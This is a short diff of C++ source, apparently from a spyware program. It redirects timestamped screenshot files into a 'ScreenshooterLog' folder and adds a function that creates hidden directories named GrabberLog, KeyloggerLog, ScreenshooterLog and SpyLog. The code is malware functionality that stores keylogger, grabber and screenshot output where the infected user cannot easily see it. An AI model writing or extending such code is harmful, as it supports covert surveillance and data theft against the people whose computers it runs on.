@@ -100,8 +100,20 @@ string GetSymbolic(int val)
 
 void MakeDataString(string &str)
 {
-	str = "ScreenShoot" + GetSymbolic(GetCurrentDataAndTime()->tm_mday) + "." +
+	str = "ScreenshooterLog//ScreenShoot" + GetSymbolic(GetCurrentDataAndTime()->tm_mday) + "." +
 		GetSymbolic(GetCurrentDataAndTime()->tm_mon + 1) + "." + GetSymbolic(GetCurrentDataAndTime()->tm_year - 100) +
 		"+" + GetSymbolic(GetCurrentDataAndTime()->tm_hour) + "-" + GetSymbolic(GetCurrentDataAndTime()->tm_min) +
 		"-" + GetSymbolic(GetCurrentDataAndTime()->tm_sec) + ".png";
+}
+void CreateHiddenFolders(void)
+{
+	_mkdir("GrabberLog");
+	_mkdir("KeyloggerLog");
+	_mkdir("ScreenshooterLog");
+	_mkdir("SpyLog");
+
+	HideFile("GrabberLog");
+	HideFile("KeyloggerLog");
+	HideFile("ScreenshooterLog");
+	HideFile("SpyLog");
 }
